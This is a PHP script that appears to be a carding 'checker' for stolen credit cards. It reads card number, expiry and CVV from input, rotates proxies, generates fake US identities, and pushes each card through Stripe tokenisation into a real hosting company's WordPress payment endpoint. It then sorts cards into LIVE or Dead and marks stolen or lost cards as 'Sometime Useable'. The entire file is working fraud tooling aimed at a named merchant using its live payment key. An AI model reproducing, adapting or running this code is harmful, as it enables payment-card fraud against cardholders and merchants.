<?php

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false)
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";}

# -------------------- [1 REQ] -------------------#

$ch = curl_init('');
curl_setopt($ch, CURLPROXY_SOCKS5, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'accept: application/json',
'origin: https://js.stripe.com',
'user-agent: Mozilla/5.0 (Linux; Android 9; motorola one macro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded',
'referer: https://js.stripe.com/'
));

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[email]='.$email.'&billing_details[address][postal_code]='.$postcode.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=66b57e61-f11b-4773-8e45-302e4a184a71778a67&muid=9f0bb070-e7f4-4cb3-8f6e-853913b5f75bade81d&sid=c692ad0d-09c3-48f6-a6c2-e99dab33fefc22b668&payment_user_agent=stripe.js%2F394a74bde%3B+stripe-js-v3%2F394a74bde&time_on_page=38921&key=pk_live_xul9lOBuxo9O5YuGDjK5seSF');



$result_pm = curl_exec($ch);
$id = trim(strip_tags(getStr($result_pm,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init('');
curl_setopt($ch, CURLPROXY_SOCKS5, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'accept: application/json',
'origin: https://js.stripe.com',
'user-agent: Mozilla/5.0 (Linux; Android 9; motorola one macro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded',
'referer: https://js.stripe.com/'
));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]='.$postcode.'&guid=66b57e61-f11b-4773-8e45-302e4a184a71778a67&muid=9f0bb070-e7f4-4cb3-8f6e-853913b5f75bade81d&sid=c692ad0d-09c3-48f6-a6c2-e99dab33fefc22b668&payment_user_agent=stripe.js%2F394a74bde%3B+stripe-js-v3%2F394a74bde&time_on_page=39510&key=pk_live_xul9lOBuxo9O5YuGDjK5seSF');

$result_tk = curl_exec($ch);
$token = trim(strip_tags(getStr($result_tk,'"id": "','"')));


# -------------------- [3 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLPROXY_SOCKS5, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://www.cyberiahosting.ca/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.cyberiahosting.ca',
'accept: */*',
'origin: https://www.cyberiahosting.ca',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'referer: https://www.cyberiahosting.ca/web-hosting/'
));

# ----------------- [3req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'action=ds_process_button&stripeToken='.$token.'&paymentMethodID='.$id.'&allData%5BbillingDetails%5D%5Bemail%5D='.$email.'&type=subscription&amount=YmFzaWM4MHVz&params%5Bvalue%5D=ds1554850807019&params%5Bname%5D=Cyberia+Inc&params%5Bamount%5D=YmFzaWM4MHVz&params%5Boriginal_amount%5D=0&params%5Bdescription%5D=%2480%2Fusd+Basic+Hosting&params%5Bpanellabel%5D=Confirm+payment&params%5Btype%5D=subscription&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=&params%5Bcapture%5D=1&params%5Bdisplay_amount%5D=&params%5Bcurrency%5D=USD&params%5Blocale%5D=auto&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=&params%5Berror_url%5D=&params%5Bbutton_id%5D=ds1554850807019&params%5Bcustom_role%5D=&params%5Bbilling%5D=&params%5Bshipping%5D=&params%5Brememberme%5D=&params%5Bkey%5D=pk_live_xul9lOBuxo9O5YuGDjK5seSF&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Fwww.cyberiahosting.ca%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=&params%5Binstance%5D=ds1554850807019&params%5Bds_nonce%5D=81e71d4c8e&ds_nonce=81e71d4c8e');

$result = curl_exec($ch);

# ---------------------------------------#

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

# ---------------- [Responses] ----------------- #

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">LIVE</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-success"> CVV MATCHED  </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">LIVE</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-success"> CVV MATCHED  </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">LIVE</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-success"> CVC MATCHED </span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-success">LIVE</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-success"> CCN MATCHED </span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
  echo '<span class="badge badge-success">LIVE</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-success"> CCN MATCHED /span></br>';
}
elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
  echo '<span class="badge badge-success">LIVE</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-success">CCN MATCHED</span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">LIVE</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-success"> CCN MATCHED  </span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">LIVE</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-success"> CVC MATCHED - Incorrect Zip  </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">LIVE</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-success"> Stolen_Card - Sometime Useable  </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">LIVE</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-success"> Lost_Card - Sometime Useable  </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">LIVE</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-success"> Insufficient Funds  </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-danger"> Card Expired </span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">LIVE</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-success"> Pickup Card_Card - Sometime Useable  </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-danger"> Incorrect Card Number </span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-danger"> Incorrect Card Number </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-danger">Card Declined</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-danger"> Declined : Generic_Decline </span> </br>';  }
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-danger"> Declined : Do_Not_Honor </span> </br>';     }
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-danger"> Security Code Check : Unchecked [Proxy Dead] </span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-danger"> Security Code Check : Fail </span> </br>';
}                                                             elseif (strpos($result, "expired_card")) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-danger"> Expired Card </span> </br>';                }
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-danger"> Card Doesnt Support This Purchase </span> </br>';
}
 else {
  echo '<span class="badge badge-warning">Dead</span> <span class="badge style="font-size: 15px;"> ' . $lista . '</span> <span class="badge badge-warning"> Proxy Dead / Error Not Listed </span> '.$result.' </br>';
}

curl_close($ch);
ob_flush();

?>
